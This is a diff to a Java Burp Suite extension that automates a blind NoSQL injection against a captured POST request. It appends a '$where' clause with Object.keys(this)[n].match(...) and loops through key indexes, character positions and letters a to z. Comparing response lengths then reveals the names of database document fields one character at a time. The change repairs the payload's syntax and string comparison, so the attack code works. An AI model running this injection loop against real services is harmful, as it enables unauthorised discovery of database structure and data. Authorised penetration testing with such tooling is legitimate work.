@@ -324,13 +324,14 @@ public class NNN implements BurpExtension {
                 HttpRequest request2send;
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
-                if (requestResponse.request().method() == "POST"){
-                    for (Integer number = 0; number < 10; number++) {
-                        for (Integer position = 0; position < 10; position++) {
+                if (requestResponse.request().method().equals("POST")){
+                    for (Integer number = 0; number < 3; number++) {
+                        for (Integer position = 0; position < 5; position++) {
                             for (Character character = 'a'; character <= 'z'; character++){
-                                request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, requestResponse.request().toString().length() - 1) + "\" $where \":\" Object . keys ( this ) [" + number.toString() + "]. match ( ’^.{" + position.toString() + "} " + character.toString() + " .* ’) \"}");
+                                request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, requestResponse.request().toString().length() - 1) + ", \"$where\":\" Object.keys(this)[" + number.toString() + "].match(’^.{" + position.toString() + "}" + character.toString() + ".*’) \"}");
                                 response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
                                 api.logging().logToOutput(number.toString() + " " + position.toString() + " " + character.toString() + " " + response2receive.response().body().length());
+                                //api.logging().logToOutput(response2receive.toString());
                             }
                         }
                     }
